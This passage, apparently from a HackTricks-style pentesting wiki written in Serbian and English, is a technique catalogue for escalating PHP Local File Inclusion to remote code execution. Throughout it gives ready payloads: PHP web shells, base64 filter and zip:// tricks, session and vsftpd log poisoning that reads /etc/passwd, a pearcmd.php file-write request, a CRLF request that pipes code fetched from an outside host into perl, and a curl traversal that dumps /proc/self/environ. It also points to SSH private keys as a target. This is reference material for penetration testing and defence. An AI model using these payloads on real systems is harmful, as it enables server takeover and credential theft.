Ako možete otpremiti fajl, jednostavno ubacite shell payload u njega (npr: `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Da bi fajl bio čitljiv, najbolje je ubaciti u metapodatke slika/doc/pdf

### Putem ZIP file upload

Upload a ZIP file koji sadrži kompresovan PHP shell i pristupite:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Putem PHP sessions

Proverite da li sajt koristi PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
U PHP-u se ove sesije čuvaju u _/var/lib/php5/sess\\_\[PHPSESSID]\_ datotekama.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Postavite cookie na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Koristi LFI da uključiš PHP session fajl.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Preko ssh

Ako je ssh aktivan, proverite koji korisnik se koristi (/proc/self/status & /etc/passwd) i pokušajte da pristupite **\<HOME>/.ssh/id_rsa**

### Preko **vsftpd** _**logs**_

Logs za FTP server vsftpd se nalaze u _**/var/log/vsftpd.log**_. U scenariju gde postoji Local File Inclusion (LFI) ranjivost, i pristup izloženom vsftpd serveru je moguć, sledeći koraci mogu biti razmotreni:

1. Injektujte PHP payload u username polje tokom procesa logovanja.
2. Nakon injekcije, iskoristite LFI da preuzmete server logs sa _**/var/log/vsftpd.log**_.

### Preko php base64 filtera (koristeći base64)

Kao što je prikazano u [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter ignoriše Non-base64. Možete to iskoristiti da zaobiđete proveru ekstenzije fajla: ako dostavite base64 koji se završava sa ".php", filter će jednostavno ignorisati "." i dodati "php" na base64. Evo primera payloada:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Putem php filters (no file needed)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) objašnjava da možete koristiti **php filters to generate arbitrary content** kao izlaz. Što u suštini znači da možete **generate arbitrary php code** za include **without needing to write** ga u datoteku.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Putem segmentation fault

**Otpremite** fajl koji će biti smešten kao **privremen** u `/tmp`, zatim u **istom zahtevu,** izazovite **segmentation fault**, i tada **privremeni fajl neće biti obrisan** i možete ga potražiti.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Putem Nginx privremenog skladištenja fajlova

Ako ste našli **Local File Inclusion** i **Nginx** radi ispred PHP-a, možda ćete moći da dobijete RCE sledećom tehnikom:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Putem PHP_SESSION_UPLOAD_PROGRESS

Ako ste pronašli **Local File Inclusion** čak i ako **nemate sesiju** i `session.auto_start` je `Off`. Ako u **multipart POST** podacima pošaljete **`PHP_SESSION_UPLOAD_PROGRESS`**, PHP će vam automatski omogućiti sesiju. Ovo možete zloupotrebiti da dobijete RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Putem privremenih upload-ova fajlova u Windows-u

Ako ste pronašli **Local File Inclusion** i server radi na **Windows-u**, možda ćete dobiti RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Putem `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Sledeće zloupotrebljava CRLF vuln da bi dobilo RCE (iz [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Putem phpinfo() (file_uploads = on)

Ako ste pronašli **Local File Inclusion** i fajl koji izlaže **phpinfo()** sa file_uploads = on, možete dobiti RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Putem compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Ako ste pronašli **Local File Inclusion** i **can exfiltrate the path** privremenog fajla, ali server proverava da li fajl koji će biti uključen ima **PHP marks**, možete pokušati da **bypass that check** pomoću ove **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Putem eternal waiting + bruteforce

Ako možete zloupotrebiti LFI da **upload temporary files** i naterate server da **hang** PHP izvršenje, možete onda **brute force filenames during hours** da biste pronašli privremeni fajl:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Do Fatal Error

Ako uključite bilo koji od fajlova `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Potrebno je uključiti isti fajl 2 puta da izazovete tu grešku).

**Ne znam koliko je ovo korisno ali može biti.**\
_Čak i ako prouzrokujete PHP Fatal Error, PHP privremeni fajlovi koji su upload-ovani se brišu._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


### Sačuvajte traversal sekvence od klijenta

Neki HTTP klijenti normalizuju ili skraćuju `../` pre nego što zahtev stigne do servera, čime se razbijaju directory traversal payloads. Koristite `curl --path-as-is` da zadržite traversal netaknut kada zloupotrebljavate log/download endpoints koji konkateniraju korisnički kontrolisano ime fajla, i dodajte `--ignore-content-length` za pseudo-fajlove kao što je `/proc`:
```bash
curl --path-as-is -b "session=$SESSION" \
"http://TARGET/admin/get_system_log?log_identifier=../../../../proc/self/environ" \
--ignore-content-length -s | tr '\000' '\n'
```
Podesite broj `../` segmenata dok ne izađete iz nameravanog direktorijuma, zatim dump `/etc/passwd`, `/proc/self/cwd/app.py`, ili druge source/config fajlove.

## Reference

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [HTB: Imagery (admin log download traversal + `/proc/self/environ` read)](https://0xdf.gitlab.io/2026/01/24/htb-imagery.html)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
